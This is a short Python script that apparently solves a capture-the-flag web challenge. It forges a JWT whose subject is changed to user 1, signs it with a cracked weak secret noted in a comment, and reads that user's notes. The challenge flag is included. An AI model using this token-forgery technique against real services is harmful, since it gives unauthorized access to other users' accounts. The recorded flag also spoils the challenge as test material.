import requests

URL = "https://securenotesmobile-challs.csc.tf"
login = '/login'
register = '/register'
notes = '/notes'
create = '/create_note'

s = requests.Session()

headers_notes = {
	'Host': 'securenotesmobile-challs.csc.tf',
	'User-Agent': 'Dart/3.3 (dart:io)',
	'Content-Type': 'application/json',
	'Accept-Encoding': 'gzip, deflate, br',
	#'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNTEyMTM4NiwianRpIjoiODZkZDdkN2UtYWY3OS00NTE3LTlkMzctNTViYzRiOWNjYmU4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6OTUsIm5iZiI6MTcyNTEyMTM4NiwiY3NyZiI6ImM4ZmUyMDE3LTk4NTEtNGY5Zi04OGEyLWRhMmM1MWMzZjUxNyIsImV4cCI6MTcyNTEyMjI4Nn0.CCGXKT3w3gN2BfjZ4vCrzJpZPhrfDixYaUaJtHSZ33k'
	'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNTEyMTM4NiwianRpIjoiODZkZDdkN2UtYWY3OS00NTE3LTlkMzctNTViYzRiOWNjYmU4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6MSwibmJmIjoxNzI1MTIxMzg2LCJjc3JmIjoiYzhmZTIwMTctOTg1MS00ZjlmLTg4YTItZGEyYzUxYzNmNTE3IiwiZXhwIjoxNzI1MzI0Mjg2fQ.qsYcdXsKVOEcj8pJ30Mc7W6gwcLxZcNYjyAXj6IwxZ8'
}

# JWT Secret: "789456123"

r = s.get(URL + notes, headers=headers_notes)
print(r)
print(r.text)

# CSCTF{1_w0nd3r_1f_y0u_f0r607_7h3_u53r_463n7}
